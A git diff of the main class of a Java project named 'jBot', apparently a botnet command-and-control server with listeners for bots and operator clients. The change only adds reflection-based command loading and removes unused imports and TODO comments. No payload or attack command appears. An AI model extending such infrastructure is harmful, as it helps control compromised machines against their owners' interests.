@@ -1,5 +1,6 @@
 package me.aaronakhtar.jbot;
 
+import me.aaronakhtar.jbot.command_manager.JBotCommand;
 import me.aaronakhtar.jbot.file_manager.ConfigFile;
 import me.aaronakhtar.jbot.file_manager.config_files.DefaultConfigurationFile;
 import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
@@ -9,10 +10,7 @@ import me.aaronakhtar.jbot.threads.BotServer;
 import me.aaronakhtar.jbot.threads.ClientServer;
 import org.reflections.Reflections;
 
-import java.io.File;
 import java.net.Socket;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -24,17 +22,19 @@ public class Main {
         System.out.println(Utilities.Colour.GREEN.get() + "\nDeveloped by Aaron Akhtar \n\n");  // excuse my promo ;P
     }
 
-
     public static final Map<String, Object> defaultConfig = ConfigFile.getProperties(new DefaultConfigurationFile());
-    public static final List<Bot>        connectedBots = new ArrayList<>();
+    public static final List<Bot>           connectedBots = new ArrayList<>();
     public static final List<Socket>        connectedClients = new ArrayList<>();
     public static volatile boolean          isRunning = true;                       //todo create 'switch' to modify this value.
     public static final String              name = "jBot";
     public static final String              encryptionKey = defaultConfig.get("encryption-key").toString();
 
+
     public static final Set<Class<? extends ConfigFile>> configFiles = new Reflections("me.aaronakhtar.jbot.file_manager.files")
             .getSubTypesOf(ConfigFile.class);
 
+    public static final Set<Class<? extends JBotCommand>> commands = new Reflections("me.aaronakhtar.jbot.command_manager.commands")
+            .getSubTypesOf(JBotCommand.class);
 
 
     public static void main(String[] args) {
@@ -55,19 +55,12 @@ public class Main {
                 }
             }
 
-
-
             Utilities.sendInternalMessage("Fetched ["+AccessKeysFile.getAccessKeys().size()+"] Access-Keys...");
 
             new ClientServer(cncPort).start();
             new BotServer(botPort).start();
 
             new BotCheckerThread().start();
-
-
-            //TODO:
-            //  create server
-            //  create client handlers
 
         }catch (Exception e){
             e.printStackTrace();
